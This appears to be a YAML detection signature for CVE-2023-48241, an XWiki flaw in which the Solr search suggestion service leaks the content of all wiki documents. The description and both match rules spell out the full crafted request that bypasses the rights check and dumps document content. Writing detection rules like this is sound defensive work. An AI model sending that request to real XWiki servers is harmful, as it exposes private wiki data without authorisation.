id: CVE-2023-48241
info:
  classification: CVE-2023-48241
  description: 'The Solr-based search suggestion provider that also duplicates as
    generic JavaScript API for search results in XWiki exposes the content of all
    documents of all wikis to anybody who has access to it, by default it is public.
    This exposes all information stored in the wiki (but not some protected information
    like password hashes). While there is a right check normally, the right check
    can be circumvented by explicitly requesting fields from Solr that don''t include
    the data for the right check. This can be reproduced by opening <xwiki-server>/xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+
    where <xwiki-server> is the URL of the XWiki installation. If this displays any
    results, the wiki is vulnerable.

    '
  name: CVE-2023-48241
  severity: high
request:
  url:
  - match: /bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+
  - match: /xwiki/bin/get/XWiki/SuggestSolrService?outputSyntax=plain&media=json&nb=1000&query=q%3D*%3A*%0Aq.op%3DAND%0Afq%3Dtype%3ADOCUMENT%0Afl%3Dtitle_%2C+reference%2C+links%2C+doccontentraw_%2C+objcontent__&input=+
